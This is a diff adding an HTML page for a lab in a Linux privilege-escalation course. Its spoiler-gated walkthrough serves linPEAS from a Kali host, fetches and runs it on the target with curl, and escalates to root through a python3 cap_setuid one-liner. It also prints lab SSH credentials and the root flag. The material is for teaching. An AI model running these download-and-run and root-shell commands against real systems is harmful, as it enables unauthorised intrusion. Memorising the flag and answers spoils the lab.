@@ -1,0 +1,239 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Atlas Mission Control — Privesc Lab 04 Loud Enumerator">
+  <title>Atlas Mission Control — Loud Enumerator</title>
+  <link rel="stylesheet" href="/static/styles.css">
+  <script src="/static/app.js" defer></script>
+</head>
+<body>
+  <main class="site-shell">
+    <div class="noise" aria-hidden="true"></div>
+    <header class="topbar">
+      <button class="brand" data-view-target="mission" aria-label="Atlas Mission Control home">
+        <span class="brand-mark"><i></i><i></i><i></i></span>
+        <span><strong>ATLAS</strong><small>VULNSEC ACADEMY</small></span>
+      </button>
+      <div class="topbar-center"><span>MODULE 02</span><b>LINUX PRIVILEGE ESCALATION</b></div>
+      <div class="environment-pill"><span class="pulse-dot"></span><span><small>ENVIRONMENT</small><strong id="environment-status">CONNECTING</strong></span></div>
+    </header>
+
+    <div class="workspace">
+      <aside class="rail" aria-label="Mission navigation">
+        <div class="rail-label">TRACE // 04</div>
+        <nav>
+          <button class="active" data-view-target="mission"><span>01</span><i></i><em>Briefing</em></button>
+          <button data-view-target="investigation"><span>02</span><i></i><em>Investigate</em></button>
+          <button data-view-target="walkthrough"><span>03</span><i></i><em>Debrief</em></button>
+        </nav>
+        <div class="rail-progress">
+          <div><span>PROGRESS</span><b id="progress-percent">0%</b></div>
+          <div class="progress-track"><i id="progress-bar"></i></div>
+          <small id="progress-copy">0 / 5 objectives cleared</small>
+        </div>
+      </aside>
+
+      <section class="content">
+        <section class="view-enter" data-view="mission">
+          <section class="mission-hero">
+            <div class="hero-copy">
+              <div class="kicker"><span>LAB 04</span><i></i> LINPEAS · TRANSFER</div>
+              <h1>LOUD<br><em>ENUMERATOR</em></h1>
+              <p>The box does not ship linPEAS. Serve it from Kali, pull it with curl, and read the output like an operator. Kernel lines and the MOTD are decoys. The real finding is a file capability you already know how to spend.</p>
+              <div class="hero-actions">
+                <button class="primary-button" data-view-target="investigation">Begin investigation <span>→</span></button>
+                <span class="time-chip">◷ &nbsp; 30–45 MIN</span>
+              </div>
+            </div>
+            <div class="radar-card" aria-label="Stylized lab network map">
+              <div class="radar-grid"></div>
+              <div class="radar-ring ring-one"></div>
+              <div class="radar-ring ring-two"></div>
+              <div class="radar-ring ring-three"></div>
+              <div class="radar-sweep"></div>
+              <div class="node kali-node"><i></i>KALI<small>HTTP :8000</small></div>
+              <div class="node target-node"><i></i><span data-target>10.23.54.221</span><small>ENUM NODE</small></div>
+              <div class="radar-caption"><span>LIVE TOPOLOGY</span><b>TARGET ASSIGNED</b></div>
+            </div>
+          </section>
+
+          <section class="mission-grid">
+            <article class="brief-card coordinates-card">
+              <div class="card-number">01</div>
+              <p class="section-label">NETWORK COORDINATES</p>
+              <div class="coordinate-row"><span>TARGET HOST</span><code data-target>10.23.54.221</code></div>
+              <div class="coordinate-row"><span>SSH</span><code>l.peel / Loud-221</code></div>
+              <div class="coordinate-row"><span>KALI GATEWAY</span><code>10.23.54.1</code></div>
+              <div class="scope-warning"><b>!</b><span>Do not run kernel PoCs in this container. The kernel is the host’s.</span></div>
+            </article>
+            <article class="brief-card objectives-card">
+              <div class="card-number">02</div>
+              <p class="section-label">MISSION OBJECTIVES</p>
+              <ol>
+                <li><span>01</span>SSH in and take the user flag</li>
+                <li><span>02</span>Serve linPEAS from Kali, curl it over</li>
+                <li><span>03</span>Read colour — kernel is noise</li>
+                <li><span>04</span>Spend the capability, take root</li>
+              </ol>
+            </article>
+            <article class="brief-card loadout-card">
+              <div class="card-number">03</div>
+              <p class="section-label">OPERATOR LOADOUT</p>
+              <div class="tool-row"><span class="tool-icon">P</span><span><b>python3 -m http.server</b><small>Kali file serve</small></span><i>READY</i></div>
+              <div class="tool-row"><span class="tool-icon">C</span><span><b>curl / wget</b><small>On the target</small></span><i>READY</i></div>
+              <div class="tool-row"><span class="tool-icon">L</span><span><b>linPEAS</b><small>linuxprivchecker optional</small></span><i>READY</i></div>
+            </article>
+          </section>
+        </section>
+
+        <section class="investigation-layout view-enter is-hidden" data-view="investigation">
+          <section class="investigation-main">
+            <div class="view-heading">
+              <div>
+                <p class="section-label">GUIDED INVESTIGATION</p>
+                <h2>Bring the tool. Read the colour.</h2>
+              </div>
+              <span id="cleared-copy">0/5 CLEARED</span>
+            </div>
+            <div class="question-stack" id="question-stack" aria-live="polite"></div>
+          </section>
+          <aside class="intel-panel">
+            <div class="intel-head"><span class="pulse-dot"></span><b>OPERATOR INTEL</b></div>
+            <div class="intel-stat"><span>LAB STATUS</span><strong id="intel-status">CONNECTING</strong></div>
+            <div class="intel-stat"><span>CURRENT PHASE</span><strong id="current-phase">01 / CONFIRM TARGET</strong></div>
+            <div class="intel-stat"><span>HINTS USED</span><strong id="hints-used">00</strong></div>
+            <div class="mini-progress"><i id="mini-progress"></i></div>
+            <p>Mission Control checks flags and findings. It never fetches linPEAS for you.</p>
+            <p class="preview-link is-hidden" id="preview-target-link">Preview mode: the notice is at <a href="/site/">/site/</a>. SSH and file transfer are not available here.</p>
+            <button class="primary-button compact is-hidden" id="open-debrief">Open debrief →</button>
+          </aside>
+        </section>
+
+        <section class="walkthrough view-enter is-hidden" data-view="walkthrough">
+          <section class="locked-walkthrough" id="walkthrough-lock">
+            <div class="lock-orbit"><span>03</span></div>
+            <p class="section-label">DEBRIEF LOCKED</p>
+            <h2>Try the mission first.</h2>
+            <p>The walkthrough names the transfer, the capability, and both flags. Complete the investigation, or reveal it if you are genuinely stuck.</p>
+            <div>
+              <button class="primary-button" data-view-target="investigation">Return to investigation <span>→</span></button>
+              <button class="ghost-button" id="reveal-walkthrough">Reveal full walkthrough</button>
+            </div>
+          </section>
+
+          <div class="is-hidden" id="walkthrough-content">
+            <div class="view-heading walkthrough-heading">
+              <div>
+                <p class="section-label">MISSION DEBRIEF</p>
+                <h2>Loud is not the same as true.</h2>
+              </div>
+              <span id="walkthrough-badge" class="success-badge">MISSION COMPLETE</span>
+            </div>
+
+            <section class="debrief-summary">
+              <div><span>01</span><p>SERVE</p><b>http.server</b></div>
+              <i>→</i>
+              <div><span>02</span><p>PULL</p><b>curl</b></div>
+              <i>→</i>
+              <div><span>03</span><p>READ</p><b>cap_setuid</b></div>
+              <i>→</i>
+              <div><span>04</span><p>SKIP</p><b>kernel</b></div>
+            </section>
+
+            <section class="walkthrough-step">
+              <div class="step-copy">
+                <span class="step-number">01</span>
+                <p class="section-label">TRANSFER</p>
+                <h3>The tool is on Kali, not on the box.</h3>
+                <p>Download linPEAS on your attacking host (see <code>tools/README.txt</code>). Serve the folder on all interfaces. On the target, read the default route — the gateway is usually <code>10.23.54.1</code>. Binding <code>127.0.0.1</code> on Kali will fail from the container.</p>
+                <div class="explain-list">
+                  <div><code>http.server</code><span>Kali, bind 0.0.0.0</span></div>
+                  <div><code>curl</code><span>Target pull</span></div>
+                  <div><code>scp</code><span>Works if HTTP is blocked</span></div>
+                </div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>kali + target</b><em>EXAMPLE OUTPUT</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>kali $</b> python3 -m http.server 8000 --bind 0.0.0.0</div>
+                  <div class="command-line"><b>target $</b> ip route</div>
+                  <div class="terminal-output"><div class="muted">default via 10.23.54.1 dev eth0</div></div>
+                  <div class="command-line"><b>target $</b> curl http://10.23.54.1:8000/linpeas.sh -o /tmp/linpeas.sh</div>
+                  <div class="command-line"><b>target $</b> chmod +x /tmp/linpeas.sh; /tmp/linpeas.sh</div>
+                </div>
+                <figcaption><i>i</i>wget is the curl equivalent. Confirm the gateway; do not cargo-cult 10.23.54.1.</figcaption>
+              </figure>
+            </section>
+
+            <section class="walkthrough-step reverse">
+              <div class="step-copy">
+                <span class="step-number">02</span>
+                <p class="section-label">COLOUR + DECOY</p>
+                <h3>Capabilities are the hit. Kernel is not.</h3>
+                <p>linPEAS will mention sudo (empty), a user cron (heartbeat), SUID helpers, MOTD “kernel 4.4.0”, and maybe LES CVEs. This is a container: the kernel is the <b>host</b> kernel. Do not run Dirty COW or any kernel PoC. The Capabilities block on python3 is the path you already practised in spirit on Setuid Tide.</p>
+                <div class="explain-list">
+                  <div><code>getcap -r /</code><span>Same finding without linPEAS</span></div>
+                  <div><code>cap_setuid+ep</code><span>os.setuid(0) then a shell</span></div>
+                  <div><code>linuxprivchecker.py</code><span>Optional alternative enumerator</span></div>
+                </div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>operator node</b><em>EXAMPLE OUTPUT</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>$</b> getcap -r / 2>/dev/null</div>
+                  <div class="terminal-output"><div class="hot">/usr/local/bin/python3.13 cap_setuid=ep</div></div>
+                  <div class="command-line"><b>$</b> python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh", "-p")'</div>
+                  <div class="terminal-output">
+                    <div># cat /root/root.txt</div>
+                    <div class="flag">LPE{loud_enumerator_root}</div>
+                  </div>
+                </div>
+                <figcaption><i>i</i>linuxprivchecker.py transfers the same way. It will also suggest kernel CVEs — treat those the same: ignore here.</figcaption>
+              </figure>
+            </section>
+
+            <section class="walkthrough-step last-step">
+              <div class="step-copy">
+                <span class="step-number">A</span>
+                <p class="section-label">ALTERNATIVE ENUMERATOR</p>
+                <h3>linuxprivchecker is optional.</h3>
+                <p>Same job as linPEAS, older Python script. Serve <code>linuxprivchecker.py</code> from Kali, <code>curl</code> it to <code>/tmp</code>, run <code>python3 /tmp/linuxprivchecker.py</code>. Grade on linPEAS + the capability. This script is extra method, not a second exploit path.</p>
+              </div>
+            </section>
+
+            <section class="completion-card">
+              <div>
+                <span>TRACE // 04</span>
+                <h3>Module 02 complete.</h3>
+                <p>You transferred a tool, read noisy output, and refused a kernel PoC on a container. sudo, cron, SUID, capabilities — four different paths, four labs. That is the privesc module.</p>
+              </div>
+              <div class="completion-stats">
+                <span><small>OBJECTIVES</small><b id="completion-objectives">05 / 05</b></span>
+                <span><small>HINTS USED</small><b id="completion-hints">00</b></span>
+              </div>
+              <button class="ghost-button" id="repeat-mission">Repeat mission</button>
+            </section>
+          </div>
+        </section>
+      </section>
+    </div>
+  </main>
+
+  <dialog class="spoiler-dialog" id="walkthrough-confirm" aria-labelledby="walkthrough-confirm-title" aria-describedby="walkthrough-confirm-copy">
+    <div class="spoiler-dialog-card">
+      <div class="spoiler-icon" aria-hidden="true">!</div>
+      <p class="section-label">SPOILER WARNING</p>
+      <h2 id="walkthrough-confirm-title">Reveal the full walkthrough?</h2>
+      <p id="walkthrough-confirm-copy">This will expose the transfer, the capability, and both flags. Your debrief will be marked <strong>SOLUTION REVEALED</strong>.</p>
+      <div class="spoiler-dialog-actions">
+        <button class="ghost-button" id="cancel-walkthrough-reveal" type="button">Cancel — keep trying</button>
+        <button class="danger-button" id="confirm-walkthrough-reveal" type="button">Reveal anyway</button>
+      </div>
+      <small>You can still complete the investigation after revealing.</small>
+    </div>
+  </dialog>
+  <div class="portal-error is-hidden" id="portal-error" role="alert"><b>MISSION CONTROL OFFLINE</b><span>Start or reset the lab, then reload this page.</span></div>
+</body>
+</html>
